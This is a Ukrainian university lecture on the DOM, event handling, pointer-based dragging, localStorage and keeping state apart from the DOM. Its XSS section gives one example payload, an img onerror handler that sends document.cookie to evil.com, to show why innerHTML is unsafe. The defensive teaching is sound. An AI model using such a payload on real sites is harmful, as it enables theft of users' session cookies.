# Лекція 4. DOM, події, взаємодія зі сторінкою

> **Курс:** Основи web програмування · ЛНУ ім. Івана Франка · ФПМІ
> **Тривалість:** 2 академічні години
> **Пов'язане завдання:** №2 «Дошка стікерів»
> **Попередня лекція:** [Лекція 3](03-javascript-language.md)

---

## Про що ця лекція

Досі JavaScript у нас працював «сам у собі» — у консолі. Тепер він зустрічається
зі сторінкою. **DOM** — це міст між мовою й документом: дерево об'єктів, яке
можна читати й змінювати, і сторінка миттєво оновлюється.

Ця лекція — практичний фундамент Завдання №2. Усе, що знадобиться для дошки
стікерів (створення елементів, перетягування мишею, редагування на місці,
збереження стану), розібрано тут.

---

## Зміст

1. [Що таке DOM](#1-що-таке-dom)
2. [Пошук елементів](#2-пошук-елементів)
3. [Читання і зміна вмісту](#3-читання-і-зміна-вмісту)
4. [Атрибути, класи, стилі, dataset](#4-атрибути-класи-стилі-dataset)
5. [Створення, вставка й видалення елементів](#5-створення-вставка-й-видалення-елементів)
6. [Шаблон `<template>`](#6-шаблон-template)
7. [Модель подій](#7-модель-подій)
8. [Делегування подій](#8-делегування-подій)
9. [Основні типи подій](#9-основні-типи-подій)
10. [Координати й розміри](#10-координати-й-розміри)
11. [Перетягування мишею](#11-перетягування-мишею)
12. [Редагування на місці](#12-редагування-на-місці)
13. [Web Storage](#13-web-storage)
14. [Спостерігачі](#14-спостерігачі)
15. [Безпека: XSS](#15-безпека-xss)
16. [Архітектура: стан окремо від DOM](#16-архітектура-стан-окремо-від-dom)
17. [Типові помилки](#17-типові-помилки)
18. [Контрольні запитання](#18-контрольні-запитання)
19. [Практичні вправи](#19-практичні-вправи)
20. [Корисні посилання](#20-корисні-посилання)
21. [Література](#21-література)
22. [Глосарій](#22-глосарій)

---

## 1. Що таке DOM

**DOM (Document Object Model)** — об'єктне подання документа у вигляді дерева.
Браузер будує його під час парсингу HTML, а JavaScript може це дерево читати й
змінювати.

```html
<html>
  <body>
    <h1 class="title">Привіт</h1>
    <p>Текст</p>
  </body>
</html>
```

```
document
└── html
    └── body
        ├── h1.title
        │   └── #text "Привіт"
        └── p
            └── #text "Текст"
```

🔑 **DOM — не ваш HTML-файл.** Це те, що браузер побудував: із виправленими
помилками розмітки, доданими `<tbody>`, зміненими скриптами вузлами.
`Ctrl+U` показує вихідний HTML, DevTools → Elements показує **актуальний DOM**.

**Типи вузлів,** які трапляються на практиці:

| Тип | `nodeType` | Приклад |
|---|---|---|
| Element | 1 | `<p>`, `<div>` |
| Text | 3 | текст усередині елемента |
| Comment | 8 | `<!-- … -->` |
| Document | 9 | сам `document` |

⚠️ Пробіли й переноси рядків між тегами — це **текстові вузли**. Тому
`element.childNodes` часто містить більше, ніж очікуєш. Для елементів
використовуйте `children`.

```js
element.children           // лише елементи (HTMLCollection)
element.childNodes         // усі вузли, включно з текстовими
element.firstElementChild
element.lastElementChild
element.parentElement
element.nextElementSibling
element.previousElementSibling
element.closest('.card')   // найближчий предок (або сам), що відповідає селектору
```

---

## 2. Пошук елементів

```js
// Сучасні універсальні методи — використовуйте їх
document.querySelector('.card');            // перший збіг або null
document.querySelectorAll('.card');         // NodeList усіх збігів

// Пошук усередині елемента, а не по всьому документу
board.querySelectorAll('.note');

// Старі спеціалізовані (швидші, але менш гнучкі)
document.getElementById('board');           // без крапки/решітки!
document.getElementsByClassName('note');    // живий HTMLCollection
document.getElementsByTagName('p');
```

⚠️ **`querySelectorAll` повертає *статичний* `NodeList`**, а
`getElementsByClassName` — *живу* колекцію, що оновлюється сама. Це джерело
підступних помилок:

```js
const items = document.getElementsByClassName('note');   // жива!
for (let i = 0; i < items.length; i++) {
  items[i].classList.remove('note');   // колекція скорочується під час циклу ⚠️
}
```

**`NodeList` — не масив.** У нього є `forEach`, але немає `map`, `filter`,
`reduce`:

```js
const notes = [...document.querySelectorAll('.note')];   // тепер це масив
notes.filter(n => n.dataset.color === 'yellow');
```

---

## 3. Читання і зміна вмісту

```js
const el = document.querySelector('.note__text');

el.textContent      // увесь текст, включно з прихованим CSS
el.innerText        // текст «як його видно» (з урахуванням стилів) — повільніше
el.innerHTML        // HTML-розмітка всередині
el.outerHTML        // разом із самим елементом

el.textContent = 'Новий текст';                  // ✅ безпечно
el.innerHTML = '<strong>Жирний</strong> текст';  // ⚠️ лише з довіреним вмістом
```

🔑 **Головне правило безпеки:** дані, введені користувачем, вставляйте **лише**
через `textContent`. Детально — розділ 15.

Різниця на прикладі:

```html
<p class="x">Привіт <span style="display:none">прихований</span> світ</p>
```

```js
el.textContent   // 'Привіт прихований світ'
el.innerText     // 'Привіт світ'
el.innerHTML     // 'Привіт <span style="display:none">прихований</span> світ'
```

---

## 4. Атрибути, класи, стилі, dataset

### 4.1. Атрибути

```js
el.getAttribute('href');
el.setAttribute('href', '/about');
el.hasAttribute('disabled');
el.removeAttribute('disabled');

// Для стандартних атрибутів зручніші властивості
link.href;            // повний URL (не те, що в розмітці!)
input.value;          // поточне значення (атрибут value — лише початкове)
input.checked;
button.disabled = true;
img.src;
```

⚠️ **Атрибут ≠ властивість.** `input.getAttribute('value')` поверне те, що
написано в HTML, а `input.value` — те, що користувач ввів зараз. Для роботи з
формами майже завжди потрібна властивість.

### 4.2. Класи

```js
el.classList.add('is-active');
el.classList.remove('is-hidden');
el.classList.toggle('is-open');
el.classList.toggle('is-open', shouldBeOpen);   // з примусовим станом
el.classList.contains('is-active');             // true/false
el.classList.replace('old', 'new');
```

🔑 **Керуйте виглядом через класи, а не через `style`.** Оформлення лишається
в CSS, JavaScript лише перемикає стан. Це і читабельніше, і дозволяє анімувати
переходи засобами CSS.

```js
// ❌
el.style.backgroundColor = '#ffeb3b';
el.style.transform = 'rotate(2deg)';

// ✅
el.classList.add('note--dragging');
```

### 4.3. Стилі

Змінювати `style` напряму варто лише для **динамічних числових значень**, які
неможливо описати класом (координати, розміри):

```js
el.style.transform = `translate(${x}px, ${y}px)`;
el.style.setProperty('--level', '80%');     // CSS-змінна
getComputedStyle(el).fontSize;              // обчислене значення (лише читання)
```

### 4.4. `dataset` — власні дані на елементі

```html
<article class="note" data-id="n-42" data-color="yellow" data-z-index="3">
```

```js
el.dataset.id;         // 'n-42'
el.dataset.color;      // 'yellow'
el.dataset.zIndex;     // '3'   ← data-z-index → zIndex (camelCase)
el.dataset.color = 'blue';
delete el.dataset.color;
```

⚠️ Значення завжди **рядки**. Число доведеться перетворити:
`Number(el.dataset.zIndex)`.

`dataset` — головний спосіб зв'язати DOM-елемент із записом у вашому стані:
за `data-id` ви знайдете відповідну нотатку.

---

## 5. Створення, вставка й видалення елементів

```js
// Створення
const note = document.createElement('article');
note.className = 'note';
note.dataset.id = id;

const title = document.createElement('h3');
title.className = 'note__title';
title.textContent = 'Нова нотатка';

note.append(title);
```

**Способи вставки:**

```js
parent.append(child);              // у кінець (можна кілька, можна рядки)
parent.prepend(child);             // на початок
element.before(newNode);           // перед елементом
element.after(newNode);            // після
element.replaceWith(newNode);      // замінити

// Точне позиціонування розмітки
element.insertAdjacentHTML('beforeend', '<span>текст</span>');
element.insertAdjacentElement('afterbegin', node);
```

Позиції для `insertAdjacent*`:

```html
<!-- beforebegin -->
<div>
  <!-- afterbegin -->
  вміст
  <!-- beforeend -->
</div>
<!-- afterend -->
```

**Видалення:**

```js
element.remove();                 // сучасний спосіб
parent.removeChild(child);        // старий
container.replaceChildren();      // очистити контейнер (краще за innerHTML = '')
```

**Пакетна вставка через фрагмент.** Якщо додаєте багато елементів, вставляти їх
по одному — дорого (кожна вставка може спричинити reflow):

```js
const fragment = document.createDocumentFragment();

for (const note of notes) {
  fragment.append(createNoteElement(note));
}

board.append(fragment);           // одна вставка в DOM
```

---

## 6. Шаблон `<template>`

`<template>` — розмітка, яку браузер парсить, але не показує й не виконує.
Ідеально для повторюваних компонентів.

```html
<template id="note-template">
  <article class="note">
    <header class="note__header">
      <button class="note__color" type="button" aria-label="Змінити колір"></button>
      <button class="note__delete" type="button" aria-label="Видалити нотатку">×</button>
    </header>
    <div class="note__body">
      <p class="note__text"></p>
    </div>
    <footer class="note__footer">
      <span class="note__counter"></span>
    </footer>
  </article>
</template>
```

```js
const template = document.querySelector('#note-template');

function createNoteElement(note) {
  const fragment = template.content.cloneNode(true);   // true — глибоке клонування
  const element = fragment.querySelector('.note');

  element.dataset.id = note.id;
  element.dataset.color = note.color;
  element.style.transform = `translate(${note.x}px, ${note.y}px)`;
  element.querySelector('.note__text').textContent = note.text;   // безпечно!

  return element;
}
```

🔑 `<template>` кращий за складання рядка HTML: розмітка лишається в HTML-файлі
(її видно й підсвічує редактор), а дані вставляються через `textContent`, тобто
безпечно.

---

## 7. Модель подій

### 7.1. Додавання обробників

```js
button.addEventListener('click', handleClick);
button.removeEventListener('click', handleClick);   // потрібне ТЕ САМЕ посилання

// Опції
element.addEventListener('click', fn, {
  once: true,       // спрацює один раз і зніметься сам
  capture: true,    // фаза занурення замість спливання
  passive: true,    // обіцяємо не викликати preventDefault (прискорює прокрутку)
  signal: controller.signal,   // можна зняти через AbortController
});
```

⚠️ **`removeEventListener` не працює з анонімною функцією:**

```js
// ❌ Обробник ніколи не зніметься — це дві РІЗНІ функції
el.addEventListener('click', () => doSomething());
el.removeEventListener('click', () => doSomething());

// ✅
const handler = () => doSomething();
el.addEventListener('click', handler);
el.removeEventListener('click', handler);
```

**`AbortController`** — найзручніший спосіб зняти багато обробників одразу:

```js
const controller = new AbortController();
const { signal } = controller;

document.addEventListener('pointermove', onMove, { signal });
document.addEventListener('pointerup', onUp, { signal });

// Пізніше — знімаємо обидва одним рядком
controller.abort();
```

Це саме те, що потрібно для завершення перетягування.

### 7.2. Фази поширення

Подія проходить три фази:

```
                   │ 1. Занурення (capturing)
        document   ▼
          body
            .board
              .note        ← 2. Ціль (target)
            .board
          body             ▲
        document           │ 3. Спливання (bubbling)
```

За замовчуванням обробники спрацьовують на фазі **спливання** — від цілі вгору.

```js
event.target          // елемент, на якому подія СТАЛАСЯ
event.currentTarget   // елемент, на якому висить ЦЕЙ обробник
event.eventPhase      // 1 — занурення, 2 — ціль, 3 — спливання
```

🔑 Різниця `target` і `currentTarget` — ключ до делегування подій.

### 7.3. Керування поширенням

```js
event.preventDefault();      // скасувати дію за замовчуванням
event.stopPropagation();     // зупинити подальше спливання
event.stopImmediatePropagation();   // + не викликати інші обробники на цьому ж елементі
```

⚠️ `stopPropagation` використовуйте обережно: він «глушить» подію для всіх
обробників вище, зокрема чужих. Часто це ламає делеговані обробники, аналітику
чи закриття випадних меню кліком поза ними.

Типові дії за замовчуванням, які скасовують:

| Подія | Дія за замовчуванням |
|---|---|
| `click` по `<a>` | перехід за посиланням |
| `submit` форми | відправка й перезавантаження сторінки |
| `contextmenu` | контекстне меню браузера |
| `dragstart` на зображенні | перетягування картинки |
| `wheel`, `touchmove` | прокручування |

---

## 8. Делегування подій

Замість того, щоб вішати обробник на кожен елемент, вішаємо **один** на
спільного предка й аналізуємо `event.target`.

```js
// ❌ Обробник на кожен стікер: 100 стікерів = 300 обробників.
//    А для нових, доданих пізніше, доведеться вішати вручну.
document.querySelectorAll('.note').forEach(note => {
  note.querySelector('.note__delete').addEventListener('click', …);
  note.querySelector('.note__color').addEventListener('click', …);
});

// ✅ Один обробник на всю дошку — і він працює для майбутніх стікерів
board.addEventListener('click', (event) => {
  const noteEl = event.target.closest('.note');
  if (!noteEl) return;

  const id = noteEl.dataset.id;

  if (event.target.closest('.note__delete')) {
    requestDelete(id);
    return;
  }

  if (event.target.closest('.note__color')) {
    openColorPicker(id);
    return;
  }
});
```

**Три причини, чому делегування — правильний підхід:**

1. **Пам'ять і продуктивність:** один обробник замість сотень.
2. **Динамічні елементи:** нові стікери працюють одразу, без «навішування».
3. **Простота прибирання:** нічого не треба знімати при видаленні елемента —
   інакше кожен видалений стікер лишав би за собою «висячі» обробники (витік
   пам'яті).

🔑 `event.target.closest(selector)` — головний інструмент делегування. Він
працює, навіть якщо клік потрапив у вкладений елемент (наприклад, в `<svg>`
всередині кнопки).

---

## 9. Основні типи подій

### 9.1. Миша та вказівник

| Подія | Коли |
|---|---|
| `click` | натискання й відпускання (працює й з клавіатури: Enter/пробіл на кнопці!) |
| `dblclick` | подвійний клік |
| `contextmenu` | права кнопка |
| `pointerdown` / `pointermove` / `pointerup` | **універсальні** події вказівника: миша, палець, стилус |
| `pointerenter` / `pointerleave` | вхід/вихід (не спливають) |
| `pointerover` / `pointerout` | те саме, але спливають |

🔑 **Використовуйте `pointer*`, а не `mouse*` чи `touch*`.** Одна модель для
всіх пристроїв: код працює і з мишею, і з пальцем, і зі стилусом. Це вимога
Завдання №2.

Корисні властивості події вказівника:

```js
event.clientX, event.clientY     // координати відносно вікна
event.pageX,   event.pageY       // відносно документа (з урахуванням прокрутки)
event.offsetX, event.offsetY     // відносно самого елемента
event.button                     // 0 — ліва, 1 — середня, 2 — права
event.buttons                    // бітова маска затиснутих кнопок
event.pointerType                // 'mouse' | 'touch' | 'pen'
event.isPrimary                  // головний вказівник (важливо для мультитач)
```

### 9.2. Клавіатура

```js
document.addEventListener('keydown', (event) => {
  if (event.key === 'Escape') closeModal();
  if (event.key === 'Delete') deleteActive();
  if (event.key === 'n' && !isTyping(event.target)) createNote();
  if (event.ctrlKey && event.key === 'z') undo();
  if (event.key === 'Enter' && event.ctrlKey) save();
});
```

- `event.key` — **символ** з урахуванням розкладки й модифікаторів
  (`'a'`, `'A'`, `'Escape'`, `'ArrowLeft'`);
- `event.code` — **фізична клавіша** незалежно від розкладки (`'KeyA'`);
- `event.ctrlKey`, `event.shiftKey`, `event.altKey`, `event.metaKey`.

⚠️ **Для гарячих клавіш латиницею** використовуйте `event.code`: із
українською розкладкою `event.key` для клавіші `N` буде `'т'`, і поєднання
не спрацює.

⚠️ Перш ніж перехоплювати одиночну літеру, перевірте, що користувач не набирає
текст:

```js
function isTyping(el) {
  return el.matches('input, textarea, [contenteditable="true"]');
}
```

### 9.3. Форми

| Подія | Коли |
|---|---|
| `input` | **на кожну зміну** значення (є в буфері обміну, автозаповненні) |
| `change` | після втрати фокуса, якщо значення змінилося |
| `submit` | відправка форми (лише на `<form>`) |
| `focus` / `blur` | фокус отримано / втрачено (**не спливають**) |
| `focusin` / `focusout` | те саме, але **спливають** (для делегування) |

```js
form.addEventListener('submit', (event) => {
  event.preventDefault();                     // не перезавантажувати сторінку
  const data = Object.fromEntries(new FormData(form));
  console.log(data);                          // { name: '…', email: '…' }
});
```

🔑 `FormData` + `Object.fromEntries` — найкоротший спосіб зібрати дані форми.

### 9.4. Документ і вікно

```js
document.addEventListener('DOMContentLoaded', init);   // DOM готовий
window.addEventListener('load', …);                    // + картинки та стилі
window.addEventListener('resize', throttle(onResize, 100));
window.addEventListener('scroll', throttle(onScroll, 100), { passive: true });
window.addEventListener('beforeunload', (e) => {       // попередження про незбережене
  if (hasUnsavedChanges) e.preventDefault();
});
document.addEventListener('visibilitychange', …);      // вкладка стала активною/фоновою
```

⚠️ `resize` і `scroll` спрацьовують десятки разів на секунду — **обов'язково**
обгортайте обробник у `throttle` (лекція 3).

### 9.5. Власні події

```js
// Створюємо
board.dispatchEvent(new CustomEvent('note:created', {
  detail: { id, text },
  bubbles: true,
}));

// Слухаємо
document.addEventListener('note:created', (event) => {
  console.log(event.detail.id);
});
```

Зручний спосіб розв'язати модулі: `drag.js` повідомляє «стікер переміщено», а
`storage.js` це чує й зберігає — не знаючи один про одного.

---

## 10. Координати й розміри

```js
const rect = element.getBoundingClientRect();
rect.top, rect.left, rect.right, rect.bottom;   // відносно ВІКНА
rect.width, rect.height;
rect.x, rect.y;

element.offsetWidth;    // ширина з padding і border
element.clientWidth;    // ширина з padding, без border і смуги прокрутки
element.scrollWidth;    // повна ширина вмісту, включно з прихованим

window.innerWidth;      // ширина вікна перегляду
window.scrollY;         // поточна прокрутка
```

⚠️ **`getBoundingClientRect` дає координати відносно вікна**, а не документа.
Щоб отримати позицію в документі, додайте прокрутку:

```js
const absoluteTop = rect.top + window.scrollY;
```

⚠️ **Не читайте геометрію в циклі впереміш зі зміною стилів** — це спричиняє
«layout thrashing» (браузер змушений перераховувати макет щоразу):

```js
// ❌ Дорого: читання → запис → читання → запис…
for (const el of elements) {
  el.style.height = el.offsetHeight * 2 + 'px';
}

// ✅ Спочатку всі читання, потім усі записи
const heights = elements.map(el => el.offsetHeight);
elements.forEach((el, i) => { el.style.height = heights[i] * 2 + 'px'; });
```

---

## 11. Перетягування мишею

Це ядро Завдання №2. Розберемо повністю.

### 11.1. Чому не HTML5 Drag and Drop API

У HTML є вбудований механізм (`draggable="true"`, події `dragstart`/`drop`), але
для нашої задачі він поганий: він створений для перенесення **даних** між
елементами й застосунками, має «привид» елемента, який майже неможливо
стилізувати, погано працює на сенсорних екранах і не дає плавного руху.

Для вільного переміщення елемента по площині правильний підхід — **власна
реалізація на подіях вказівника**. Саме цього вимагає завдання.

### 11.2. Алгоритм

1. `pointerdown` на «ручці»: запам'ятати початкові координати й **зсув
   захоплення** (де саме всередині елемента натиснули).
2. `pointermove` на `document`: обчислити нову позицію, обмежити межами дошки,
   застосувати `transform`.
3. `pointerup`: зафіксувати позицію в стані, зняти обробники.

### 11.3. Реалізація

```js
// drag.js
export function makeDraggable(element, { handle, bounds, onDrop }) {
  const handleEl = handle ? element.querySelector(handle) : element;

  handleEl.addEventListener('pointerdown', onPointerDown);

  function onPointerDown(event) {
    // Тільки основна кнопка й основний вказівник
    if (event.button !== 0 || !event.isPrimary) return;

    const elementRect = element.getBoundingClientRect();
    const boundsRect = bounds.getBoundingClientRect();

    // Зсув точки захоплення всередині елемента — щоб елемент не «стрибав»
    const grabOffsetX = event.clientX - elementRect.left;
    const grabOffsetY = event.clientY - elementRect.top;

    const controller = new AbortController();
    const { signal } = controller;

    element.classList.add('note--dragging');
    handleEl.setPointerCapture(event.pointerId);   // події йтимуть сюди навіть поза елементом

    let lastX = 0;
    let lastY = 0;

    document.addEventListener('pointermove', onPointerMove, { signal });
    document.addEventListener('pointerup', onPointerUp, { signal });
    document.addEventListener('pointercancel', onPointerUp, { signal });

    function onPointerMove(moveEvent) {
      const maxX = boundsRect.width - elementRect.width;
      const maxY = boundsRect.height - elementRect.height;

      const rawX = moveEvent.clientX - boundsRect.left - grabOffsetX;
      const rawY = moveEvent.clientY - boundsRect.top - grabOffsetY;

      // Обмеження межами дошки (clamping)
      lastX = Math.min(Math.max(rawX, 0), Math.max(maxX, 0));
      lastY = Math.min(Math.max(rawY, 0), Math.max(maxY, 0));

      element.style.transform = `translate(${lastX}px, ${lastY}px)`;
    }

    function onPointerUp() {
      element.classList.remove('note--dragging');
      controller.abort();                 // знімаємо ВСІ три обробники одразу
      onDrop?.({ x: lastX, y: lastY });   // повідомляємо стан
    }
  }
}
```

Потрібний CSS:

```css
.note {
  position: absolute;
  top: 0;
  left: 0;                    /* позиція керується лише transform */
  touch-action: none;         /* вимикає прокручування пальцем по стікеру */
  will-change: transform;
}

.note__header {
  cursor: grab;
  user-select: none;          /* не виділяти текст при перетягуванні */
}

.note--dragging {
  cursor: grabbing;
  z-index: 999;
  box-shadow: 0 12px 32px rgb(0 0 0 / 25%);
  rotate: 1.5deg;
}

.note--dragging .note__header { cursor: grabbing; }
```

### 11.4. Чому саме так — розбір ключових рішень

| Рішення | Причина |
|---|---|
| Обробники `pointermove`/`pointerup` на **`document`**, а не на елементі | При швидкому русі курсор випереджає елемент і «вилітає» за нього — подія б не спрацювала |
| `setPointerCapture` | Гарантує, що всі події вказівника йтимуть до цього елемента, навіть якщо курсор над іншим |
| `AbortController` | Знімає всі обробники одним викликом; забути зняти хоч один — стікер «прилипне» до курсора |
| `transform: translate` замість `left`/`top` | Composite замість layout — плавно навіть при десятках елементів |
| Зсув захоплення (`grabOffset`) | Без нього елемент стрибне лівим верхнім кутом під курсор |
| `touch-action: none` | Інакше на телефоні жест прокрутить сторінку, а не перетягне стікер |
| `user-select: none` на ручці | Інакше при русі виділяється текст |
| `pointercancel` | Система може перервати жест (вхідний дзвінок, жест ОС) — без обробки стікер лишиться «в русі» |
| Обмеження координат | Стікер не має губитися за межами дошки |

🧪 Перевірте кожен пункт експериментально: приберіть по одному рядку й
подивіться, як саме ламається поведінка. Це найкращий спосіб зрозуміти, навіщо
вони.

---

## 12. Редагування на місці

Два підходи.

### 12.1. `<textarea>`, що з'являється на місці тексту

```js
function startEditing(noteEl, note) {
  const textEl = noteEl.querySelector('.note__text');

  const textarea = document.createElement('textarea');
  textarea.className = 'note__editor';
  textarea.value = note.text;
  textarea.maxLength = 500;

  textEl.replaceWith(textarea);
  textarea.focus();
  textarea.setSelectionRange(textarea.value.length, textarea.value.length);

  autoGrow(textarea);
  textarea.addEventListener('input', () => autoGrow(textarea));

  const finish = (save) => {
    const newText = textarea.value.trim();
    textarea.replaceWith(textEl);
    if (save) {
      updateNote(note.id, { text: newText });   // оновлюємо СТАН
      textEl.textContent = newText;             // потім DOM
    }
  };

  textarea.addEventListener('blur', () => finish(true));
  textarea.addEventListener('keydown', (event) => {
    if (event.key === 'Escape') { event.preventDefault(); finish(false); }
    if (event.key === 'Enter' && (event.ctrlKey || event.metaKey)) finish(true);
  });
}

function autoGrow(textarea) {
  textarea.style.height = 'auto';
  textarea.style.height = Math.min(textarea.scrollHeight, 320) + 'px';
}
```

### 12.2. `contenteditable`

```html
<p class="note__text" contenteditable="plaintext-only"></p>
```

```js
textEl.addEventListener('input', () => {
  updateNote(id, { text: textEl.textContent });
});
```

🔑 Значення **`plaintext-only`** принципове: звичайний `contenteditable="true"`
дозволяє вставляти форматований HTML із буфера обміну — разом із потенційно
небезпечними тегами. `plaintext-only` вставляє лише текст.

**Порівняння:**

| | `<textarea>` | `contenteditable` |
|---|---|---|
| Керування значенням | просте (`value`) | через `textContent` |
| Автовисота | треба реалізувати | автоматична |
| Ризик вставки HTML | немає | є (крім `plaintext-only`) |
| Скасування (Escape) | легко | треба зберігати попереднє значення |
| Рекомендація | ✅ надійніше | прийнятно з `plaintext-only` |

---

## 13. Web Storage

```js
localStorage.setItem('notes', JSON.stringify(notes));
const raw = localStorage.getItem('notes');
localStorage.removeItem('notes');
localStorage.clear();
localStorage.length;
```

| | `localStorage` | `sessionStorage` |
|---|---|---|
| Час життя | доки не видалять | до закриття вкладки |
| Спільний доступ | усі вкладки одного походження | лише ця вкладка |
| Обсяг | ~5–10 МБ | ~5 МБ |
| Тип даних | **лише рядки** | лише рядки |

**Надійна обгортка** (потрібна в Завданні №2):

```js
// storage.js
const KEY = 'sticky-notes:v1';

export function loadNotes() {
  try {
    const raw = localStorage.getItem(KEY);
    if (!raw) return [];

    const parsed = JSON.parse(raw);
    if (!Array.isArray(parsed)) return [];

    // Валідація: пошкоджені записи відкидаємо, а не падаємо
    return parsed.filter(n =>
      n && typeof n.id === 'string' && typeof n.text === 'string'
    );
  } catch (error) {
    console.warn('Не вдалося прочитати збережені нотатки:', error);
    return [];
  }
}

export function saveNotes(notes) {
  try {
    localStorage.setItem(KEY, JSON.stringify(notes));
  } catch (error) {
    // QuotaExceededError або приватний режим у деяких браузерах
    console.warn('Не вдалося зберегти нотатки:', error);
  }
}
```

Разом із `debounce` (лекція 3):

```js
import { debounce } from './utils.js';
export const saveNotesDebounced = debounce(saveNotes, 300);
```

**Синхронізація між вкладками** — приємний бонус, що робиться одним рядком:

```js
window.addEventListener('storage', (event) => {
  if (event.key === KEY) {
    render(JSON.parse(event.newValue ?? '[]'));
  }
});
```

⚠️ Подія `storage` спрацьовує **в інших вкладках**, а не в тій, що записувала.

⚠️ `localStorage` **синхронний** — великі обсяги блокують головний потік. Не
зберігайте туди зображення чи мегабайти даних (для цього є IndexedDB).

⚠️ Ніколи не зберігайте в `localStorage` паролі й чутливі дані: будь-який
скрипт на сторінці має до нього доступ.

---

## 14. Спостерігачі

Три API, що дозволяють реагувати на зміни без опитування в циклі.

```js
// Елемент з'явився у вікні перегляду (ліниве завантаження, анімації появи)
const io = new IntersectionObserver((entries) => {
  for (const entry of entries) {
    if (entry.isIntersecting) {
      entry.target.classList.add('is-visible');
      io.unobserve(entry.target);
    }
  }
}, { threshold: 0.2, rootMargin: '0px 0px -10% 0px' });

document.querySelectorAll('.section').forEach(el => io.observe(el));

// Змінився розмір елемента (а не вікна!)
const ro = new ResizeObserver((entries) => {
  for (const entry of entries) {
    const { width } = entry.contentRect;
    entry.target.classList.toggle('is-narrow', width < 400);
  }
});
ro.observe(board);

// Змінився DOM
const mo = new MutationObserver((mutations) => { … });
mo.observe(board, { childList: true, subtree: true });
```

🔑 `IntersectionObserver` замінює старий підхід із `scroll` + перевіркою
координат: він працює поза головним потоком і не гальмує прокрутку.

---

## 15. Безпека: XSS

**XSS (Cross-Site Scripting)** — впровадження чужого JavaScript у вашу
сторінку. Класичний сценарій: користувач вводить у поле не текст, а розмітку,
і вона виконується у браузерах усіх, хто це побачить.

```js
const userInput = '<img src=x onerror="fetch(`https://evil.com?c=${document.cookie}`)">';

el.innerHTML = userInput;    // 💥 скрипт виконається
el.textContent = userInput;  // ✅ покажеться як звичайний текст
```

⚠️ Зверніть увагу: `<script>` через `innerHTML` не виконується, і багато хто
через це вважає `innerHTML` безпечним. Це помилка — обробники подій на кшталт
`onerror`, `onload`, `onfocus` спрацюють чудово.

### Правила

1. **Дані користувача — тільки через `textContent`** (або `setAttribute` для
   атрибутів).
2. **Не вставляйте користувацькі дані в шаблонний рядок HTML.**
3. Якщо форматований HTML справді потрібен — очищайте його бібліотекою
   [DOMPurify](https://github.com/cure53/DOMPurify).
4. Не покладайтеся на перевірку лише на клієнті: серверна валідація
   обов'язкова (лекція 15).
5. Ставте `contenteditable="plaintext-only"`.

```js
// ❌ Небезпечно
board.innerHTML += `<div class="note">${note.text}</div>`;

// ✅ Безпечно
const el = template.content.cloneNode(true);
el.querySelector('.note__text').textContent = note.text;
board.append(el);
```

📚 [OWASP: XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

---

## 16. Архітектура: стан окремо від DOM

Найважливіша ідея цієї лекції — і причина, чому Завдання №2 виглядає саме так.

### 16.1. Дві архітектури

**Погана: DOM як джерело істини.**

```js
// Скільки нотаток? Порахуємо елементи…
const count = document.querySelectorAll('.note').length;

// Змінити текст? Знайдемо елемент і змінимо
document.querySelector(`[data-id="${id}"] .note__text`).textContent = newText;

// Зберегти? Обійдемо DOM і зберемо дані назад…
```

Проблеми: дані «розмазані» по атрибутах і текстових вузлах; збереження вимагає
зворотного розбору DOM; будь-яка зміна розмітки ламає логіку; неможливо
протестувати без браузера.

**Хороша: стан — джерело істини, DOM — його відображення.**

```
       дія користувача
             │
             ▼
      оновлення СТАНУ (чисті функції)
             │
             ▼
      рендеринг DOM зі стану
             │
             ▼
      збереження стану в localStorage
```

```js
// state.js — жодного DOM, лише дані
let notes = [];

export const getNotes = () => notes;

export function addNote(note) {
  notes = [...notes, note];
  notifyChange();
}

export function updateNote(id, changes) {
  notes = notes.map(n => (n.id === id ? { ...n, ...changes } : n));
  notifyChange();
}

export function removeNote(id) {
  notes = notes.filter(n => n.id !== id);
  notifyChange();
}

const listeners = new Set();
export const subscribe = (fn) => { listeners.add(fn); return () => listeners.delete(fn); };
const notifyChange = () => listeners.forEach(fn => fn(notes));
```

```js
// main.js — зв'язування
import { getNotes, addNote, subscribe } from './state.js';
import { renderBoard } from './render.js';
import { loadNotes, saveNotesDebounced } from './storage.js';

subscribe(renderBoard);          // будь-яка зміна стану перемальовує дошку
subscribe(saveNotesDebounced);   // і зберігає її

loadNotes().forEach(addNote);
```

🔑 Це рівно та сама модель, на якій побудований React (лекції 6–10). Зробивши
її вручну в Завданні №2, ви значно легше зрозумієте, що саме React автоматизує.

### 16.2. Оптимізація рендерингу

Повністю перемальовувати дошку на кожен рух миші — марнотратно. Практичний
компроміс:

- **під час перетягування** змінюємо лише `transform` конкретного елемента;
- **у стан** записуємо координати один раз, на `pointerup`;
- **повний рендеринг** — лише при додаванні, видаленні чи зміні тексту.

---

## 17. Типові помилки

| # | Помилка | Наслідок | Правильно |
|---|---|---|---|
| 1 | `innerHTML` з даними користувача | Уразливість XSS | `textContent` |
| 2 | Обробник на кожен елемент | Витоки пам'яті, не працює для нових | Делегування |
| 3 | `removeEventListener` з новою анонімною функцією | Обробник не знімається | Зберігати посилання або `AbortController` |
| 4 | `pointermove` на елементі, а не на `document` | Стікер «губить» курсор | Слухати `document` + `setPointerCapture` |
| 5 | Не зняли обробники в `pointerup` | Елемент «прилипає» до курсора | `AbortController` |
| 6 | Анімація через `left`/`top` | Падіння FPS | `transform` |
| 7 | Немає `touch-action: none` | На телефоні прокручується сторінка | Додати в CSS |
| 8 | Не враховано зсув захоплення | Елемент стрибає під курсор | `grabOffset` |
| 9 | `JSON.parse` без `try/catch` | Падіння на пошкоджених даних | Безпечна обгортка |
| 10 | Запис у `localStorage` на кожен `pointermove` | Гальмування | `debounce` |
| 11 | Стан зберігається лише в DOM | Неможливо серіалізувати й тестувати | Окремий модуль стану |
| 12 | `getElementsByClassName` у циклі зі зміною класів | Жива колекція змінюється під час обходу | `querySelectorAll` + spread |
| 13 | `stopPropagation` «про всяк випадок» | Ламає делеговані обробники | Використовувати свідомо |
| 14 | `<div onclick>` замість `<button>` | Недоступно з клавіатури | Семантичний елемент |
| 15 | Обробники до `DOMContentLoaded` | `querySelector` повертає `null` | `defer` / `type="module"` |
| 16 | Читання геометрії впереміш зі зміною стилів | Layout thrashing | Групувати читання й записи |

---

## 18. Контрольні запитання

1. Чим DOM відрізняється від вихідного HTML-коду?
2. Чому `element.children` зазвичай коротший за `element.childNodes`?
3. Чим `querySelectorAll` відрізняється від `getElementsByClassName`?
